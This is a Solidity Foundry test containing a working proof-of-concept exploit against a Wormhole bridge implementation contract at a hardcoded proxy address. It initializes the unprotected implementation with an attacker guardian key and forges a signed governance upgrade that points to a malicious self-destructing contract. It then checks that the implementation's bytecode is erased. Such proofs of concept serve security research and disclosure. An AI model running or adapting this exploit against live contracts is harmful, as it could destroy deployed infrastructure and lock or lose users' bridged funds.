// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {ECDSA} from "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";

import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";
import {IWormholeImpl} from "./IWormholeImplementation.sol";
import {IProxy} from "./IProxy.sol";
import {MaliciousContract} from "src/Malicious.sol";

contract WormHoleExploitTest is Test {
    using ECDSA for bytes32;
    using MessageHashUtils for bytes32;

    bytes32 constant IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    address constant WORMHOLE_PROXY = 0x98f3c9e6E3fAce36bAAd05FE09d375Ef1464288B;

    IWormholeImpl public wormholeProxy;
    IWormholeImpl public wormholeImpl;
    MaliciousContract public destructor;

    address attackerSigner;
    uint256 attackerPrivateKey;

    function setUp() public {
        wormholeProxy = IWormholeImpl(WORMHOLE_PROXY);
        wormholeImpl = IWormholeImpl(getImplementation(WORMHOLE_PROXY));

        (attackerSigner, attackerPrivateKey) = makeAddrAndKey("attacker");
        vm.deal(attackerSigner, 5 ether);

        destructor = new MaliciousContract();
    }

    function getFirstBytes(bytes memory data, uint256 n) internal pure returns (bytes memory) {
        require(n <= data.length, "Requested length exceeds data length");
        bytes memory result = new bytes(n);
        for (uint256 i = 0; i < n; i++) {
            result[i] = data[i];
        }
        return result;
    }

    function test_Exploit() public {
        //Verify initial conditions
        assertNotEq(wormholeProxy.chainId(), wormholeImpl.chainId());
        assertEq(wormholeImpl.chainId(), 0);

        assertTrue(address(wormholeImpl).code.length > 0);
        bytes memory firstBytes = getFirstBytes(address(wormholeImpl).code, 12);
        console.log("Wormhole bytecode before: ", bytesToHexString(firstBytes));

        address[] memory guardians = new address[](1);
        guardians[0] = attackerSigner;
        wormholeImpl.initialize(guardians, 0, 0, bytes32(0));
        console.log("WormholeImpl initialized with attacker guardian");

        //Prepare upgrade data
        bytes memory data = abi.encodePacked(
            hex"00000000000000000000000000000000000000000000000000000000436f726501", uint16(0), address(destructor)
        );

        //Generate VM bytes for an upgrade
        bytes memory vm = signAndEncodeVM(
            0,
            0,
            wormholeImpl.governanceChainId(),
            wormholeImpl.governanceContract(),
            0,
            data,
            attackerPrivateKey,
            wormholeImpl.getCurrentGuardianSetIndex(),
            2 //consistency level
        );

        console.log("Malicious Vm prepared");
        console.log("Upgrading WormholeImpl contract with VM");

        // Submit upgrade
        wormholeImpl.submitContractUpgrade(vm);

        // Verify implementation was destroyed
        assertEq(address(wormholeImpl).code.length, 0);
        console.log("WormholeImpl bytecode after:", bytesToHexString(address(wormholeImpl).code));
    }

    function getImplementation(address proxy) internal view returns (address) {
        bytes32 implSlotData = vm.load(proxy, IMPLEMENTATION_SLOT);
        return address(uint160(uint256(implSlotData)));
    }

    function signAndEncodeVM(
        uint32 timestamp,
        uint32 nonce,
        uint16 emitterChainId,
        bytes32 emitterAddress,
        uint64 sequence,
        bytes memory data,
        uint256 signerPrivateKey,
        uint32 guardianSetIndex,
        uint8 consistencyLevel
    ) internal pure returns (bytes memory) {
        //Construct the body of the message
        bytes memory body =
            abi.encodePacked(timestamp, nonce, emitterChainId, emitterAddress, sequence, consistencyLevel, data);

        //Hash the body following Wormhole's double hashing pattern
        bytes32 hash = keccak256(abi.encodePacked(keccak256(body)));

        //Create ethereum signed message hash
        bytes32 ethSignedHash = hash.toEthSignedMessageHash();

        //Signed the message using the guardian's private key
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPrivateKey, ethSignedHash);

        bytes memory signature = abi.encodePacked(uint8(0), r, s, v);

        return abi.encodePacked(
            uint8(1),
            guardianSetIndex,
            uint8(1), //Number of signatures
            signature,
            body
        );
    }

    function bytesToHexString(bytes memory buffer) internal pure returns (string memory) {
        bytes memory converted = new bytes(buffer.length * 2);
        bytes memory _base = "0123456789abcdef";

        for (uint256 i = 0; i < buffer.length; i++) {
            converted[i * 2] = _base[uint8(buffer[i]) / 16];
            converted[i * 2 + 1] = _base[uint8(buffer[i]) % 16];
        }

        return string(abi.encodePacked("0x", converted));
    }
}
